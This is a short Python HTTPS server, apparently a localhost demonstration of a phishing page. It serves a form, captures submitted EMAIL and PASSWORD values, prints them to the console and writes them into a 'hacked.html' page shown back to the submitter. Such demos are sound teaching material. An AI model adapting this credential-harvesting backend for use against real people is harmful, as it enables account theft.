from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import logging

port = 8887

def prepare_html_hacked(client_data):
        with open('form.html', 'r') as form:
            with open('hacked.html', 'w') as final:
                lines = form.read().splitlines()
                for line in lines:                 
                    if "EMAIL" in line:
                        line = f"    <p>{client_data['EMAIL']}</p>"
                    if "PASSWORD" in line:
                        line = f"    <p>{client_data['PASSWORD']}</p>"
                    final.write(line + "\n")

class MyRequestHandler(BaseHTTPRequestHandler):
                    
    
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
    def do_GET(self):
        self._set_response()
        
        if self.path == "/":
            with open('index.html') as file:
                for line in file.readlines():
                    self.wfile.write(bytes(line, 'utf-8'))
            
    
    def do_POST(self):
        # Gets the size of data
        content_length = int(self.headers['Content-Length']) 
        # Gets the data itself
        post_data = self.rfile.read(content_length) 
        post_data = post_data.decode('utf-8')

        items = post_data.split("&")
        hacked_data = {}
        for item in items:
            item = item.split("=")
            hacked_data[item[0]] = item[1]

        print(hacked_data)
        prepare_html_hacked(hacked_data)
        self._set_response()
        with open('hacked.html') as file:
            for line in file.readlines():
                self.wfile.write(bytes(line, 'utf-8'))

logging.basicConfig(level=logging.INFO)
httpd = HTTPServer(('localhost', port), MyRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket,
                               keyfile="privkeyA.pem",
                               certfile="certA.crt",
                               server_side=True)


print(f"server listening on port {port}")
httpd.serve_forever()

